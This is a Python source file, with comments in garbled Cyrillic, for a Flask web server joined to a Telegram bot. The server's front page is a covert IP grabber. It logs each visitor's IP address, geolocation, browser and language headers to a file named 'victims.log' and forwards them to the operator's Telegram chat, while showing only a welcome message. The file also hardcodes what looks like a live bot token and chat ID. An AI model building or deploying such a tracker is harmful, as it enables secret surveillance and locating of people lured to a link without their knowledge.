from flask import Flask, request
import requests
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

app = Flask(__name__)

# –¢–æ–∫–µ–Ω –±–æ—Ç–∞ –∏ —Ç–≤–æ–π Telegram ID
BOT_TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE"
CHAT_ID = "7477642275"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# –¢–æ–∫–µ–Ω—ã –¥–ª—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö API
IPINFO_TOKEN = "your_ipinfo_token"
IPSTACK_TOKEN = "your_ipstack_token"

# –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± IP
def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,mobile,proxy,hosting,timezone,query")
        data = response.json()
        if data.get("status") == "fail":
            raise ValueError("–î–∞–Ω–Ω—ã–µ —Å ip-api –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã")
        return format_ip_info(data)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å ip-api.com: {e}")

    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}")
        data = response.json()
        if "error" in data:
            raise ValueError("–î–∞–Ω–Ω—ã–µ —Å ipinfo.io –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã")
        return format_ip_info(data)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å ipinfo.io: {e}")

    try:
        response = requests.get(f"http://api.ipstack.com/{ip}?access_key={IPSTACK_TOKEN}&fields=country,region_name,city,zip,latitude,longitude,isp,organization,connection_type,timezone")
        data = response.json()
        if "error" in data:
            raise ValueError("–î–∞–Ω–Ω—ã–µ —Å ipstack.com –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã")
        return format_ip_info(data)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å ipstack.com: {e}")

    return f"IP: {ip} (–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞)"

# –§—É–Ω–∫—Ü–∏—è —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
def format_ip_info(data):
    return (f"üîπ IP: {data.get('ip', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
            f"üåç –°—Ç—Ä–∞–Ω–∞: {data.get('country', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
            f"üèô –†–µ–≥–∏–æ–Ω: {data.get('region_name', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
            f"üè† –ì–æ—Ä–æ–¥: {data.get('city', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
            f"üïí –í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞: {data.get('timezone', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
            f"üìç –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: {data.get('latitude', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}, {data.get('longitude', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
            f"üì° –ü—Ä–æ–≤–∞–π–¥–µ—Ä: {data.get('isp', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
            f"üè¢ –û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è: {data.get('organization', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
            f"üîó AS: {data.get('asn', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
            f"üì± –ú–æ–±–∏–ª—å–Ω—ã–π: {'–î–∞' if data.get('mobile') else '–ù–µ—Ç'}\n"
            f"üõ° –ü—Ä–æ–∫—Å–∏: {'–î–∞' if data.get('proxy') else '–ù–µ—Ç'}\n"
            f"üè¢ –•–æ—Å—Ç–∏–Ω–≥: {'–î–∞' if data.get('hosting') else '–ù–µ—Ç'}")

# –ö–æ–º–∞–Ω–¥–∞ /start
def start(update: Update, context: CallbackContext):
    update.message.reply_text("–ü—Ä–∏–≤–µ—Ç! –Ø –º–æ–≥—É –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –ø–æ IP. –ò—Å–ø–æ–ª—å–∑—É–π –∫–æ–º–∞–Ω–¥—É /ip <IP>.")

# –ö–æ–º–∞–Ω–¥–∞ /ip <ip>
def ip_info(update: Update, context: CallbackContext):
    if context.args:
        ip = context.args[0]  # –ü–æ–ª—É—á–∞–µ–º IP –∏–∑ –∫–æ–º–∞–Ω–¥—ã
        ip_info = get_ip_info(ip)
        update.message.reply_text(ip_info)
    else:
        update.message.reply_text("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏ IP –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã, –Ω–∞–ø—Ä–∏–º–µ—Ä: /ip 8.8.8.8")

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –≤ Telegram
def send_to_telegram(message):
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(TELEGRAM_API, data=payload)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: {e}")

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    # –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–æ–º–∞–Ω–¥
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("ip", ip_info))

    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞
    updater.start_polling()
    updater.idle()

# Flask —Å–µ—Ä–≤–µ—Ä –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≤–µ–±-–∑–∞–ø—Ä–æ—Å–æ–≤
@app.route('/')
def log_ip():
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)  # –£—á–∏—Ç—ã–≤–∞–µ–º –ø—Ä–æ–∫—Å–∏
    user_agent = request.headers.get("User-Agent")
    referer = request.headers.get("Referer", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
    accept_language = request.headers.get("Accept-Language", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
    dnt = request.headers.get("DNT", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")

    ip_info = get_ip_info(user_ip)
    log_message = (f"{ip_info}\n"
                   f"üñ• User-Agent: {user_agent}\n"
                   f"üîó Referer: {referer}\n"
                   f"üåê –Ø–∑—ã–∫: {accept_language}\n"
                   f"üö´ DNT (–ù–µ –æ—Ç—Å–ª–µ–∂–∏–≤–∞—Ç—å): {'–í–∫–ª—é—á–µ–Ω–æ' if dnt == '1' else '–í—ã–∫–ª—é—á–µ–Ω–æ'}")

    # –ó–∞–ø–∏—Å—å –≤ —Ñ–∞–π–ª
    with open('victims.log', 'a') as f:
        f.write(f"{log_message}\n\n")

    # –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
    send_to_telegram(log_message)

    return "–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –Ω–∞ —Å–∞–π—Ç!"

if __name__ == '__main__':
    # –ó–∞–ø—É—Å–∫ Flask —Å–µ—Ä–≤–µ—Ä–∞ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    from threading import Thread
    flask_thread = Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': 5000})
    flask_thread.start()

    # –ó–∞–ø—É—Å–∫ Telegram-–±–æ—Ç–∞
    main()
